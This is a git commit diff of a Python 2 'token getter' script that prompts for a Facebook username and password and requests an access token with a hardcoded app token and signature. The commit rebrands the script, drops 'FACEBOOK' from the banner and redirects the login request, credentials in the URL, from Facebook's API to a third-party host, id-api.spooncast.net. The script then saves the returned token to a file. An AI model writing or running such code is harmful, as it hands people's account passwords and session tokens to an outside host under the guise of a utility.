3e5b06c4b9e005d473029bc64c11119fcd38072e
reyza98 <70235414+reyza98@users.noreply.github.com>
2020-09-19 02:44:19 +0700

    Update token_noobs.py

--- token_noobs.py
+++ token_noobs.py
@@ -1,6 +1,6 @@
-# Team: Life Of Programmer
-# Mod By: Iqbalz Noobs
-# klo gak ada passion jangan jadi programmer, ngoding itu berat kamu gk akan kuat...
+#
+
+
 
 import os
 import sys
@@ -32,28 +32,28 @@ def banner_noobs():
                 print " "
                 runntxt(bl+"     L I F E   O F   P R O G R A M M E R")
                 print pu+"+-------------------------------------------+"
-                print "| Mod By: Iqbalz Noobs                       |"
-                print "| FB    : Iqbalznoobs                        |"
-                print "| Github: https://www.github.com/IqbalzNoobs |"
+                print "| Mod By: REYZA                       |"
+                print "| IG    : RKENZY1                        |"
+                print "| Github: https://www.github.com/reyza98 |"
                 print g+ "+-------------------------------------------+"
                 print " "
                 print "   D A P A T K A N  A C C E S S  T O K E N"
-                print "  F A C E B O O K  K A M U  S E K A R A N G"
+                print "    K A M U  S E K A R A N G"
                 print "+-------------------------------------------+"
                  
 banner_noobs()
 
 user_noobs = raw_input(r+'[?] \033[96mUsername FB lu Tod\033[97m: ')
 passwordlu = raw_input(g+'[?] \033[95mPassword FB lu Tod\033[97m: ')
-iqbalz_noobs = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user_noobs+'&locale=en_US&password='+passwordlu+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+iqbalz_noobs = requests.get('https://id-api.spooncast.net/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user_noobs+'&locale=en_US&password='+passwordlu+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 
 lop = iqbalz_noobs.content
 bacot = json.loads(lop)
 if "session_key" in lop:
                 print " "
                 runntxt(w+" Loading..........")
-		print pu+"[+] Token Fb Anda adalah \033[91m=>\033[92m " + bacot["access_token"]
-		open(user_noobs+"iqbalz_token.txt", 'a').write(bacot["access_token"])
+		print pu+"[+] Token Anda adalah \033[91m=>\033[92m " + bacot["access_token"]
+		open(user_noobs+"rey_token.txt", 'a').write(bacot["access_token"])
 		print " "
 		print w+"        T O K E N  S U C C E S S "
                 print w+"                  T O D"
